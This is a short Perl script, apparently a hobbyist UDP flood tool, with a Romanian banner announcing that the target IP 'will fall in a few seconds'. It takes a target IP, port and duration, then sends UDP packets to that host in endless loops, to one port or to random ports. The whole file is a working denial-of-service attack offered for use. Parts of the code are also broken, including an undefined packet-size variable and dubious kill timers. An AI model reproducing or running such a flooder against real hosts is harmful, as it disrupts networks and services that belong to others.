#!/usr/bin/perl


use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
 printf "$0 <ip> <port> <time>\n";
 printf "Ai gresit comanda, mai incearca! n";
 exit(1);
}

my ($ip,$port,$size,$time);
 $ip=$ARGV[0];
 $port=$ARGV[1]; 
 $time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "\033[1;32m«\033[1;31m 
 ##############################
 #Tropikal ataca ip:          #
 #$ip               #
 #Ip-ul o sa pice in cateva   #
 #Secunde.                    #
 #Daca ip-ul nu pica ,        #   
 #Nu e vina rootului ci a ta  #
 #By Londonezu.               #
 ##############################
 ";
printf "\033[1;32m«\033[1;31m ¦ Tropikal ¦ Incepe Atacul ¦¦ @ 2016-2017 ¦¦¦ ¦ \033[1;33m ¦ By:Tropikal¦ \033[1;34m 
  ¦¦ IP-UL Floodat a picat! ¦¦            \033 \033[1;32m»\033[0m\n\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -0 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -8 udp) &"); 
 goto randpackets;
}

packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
} 

randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}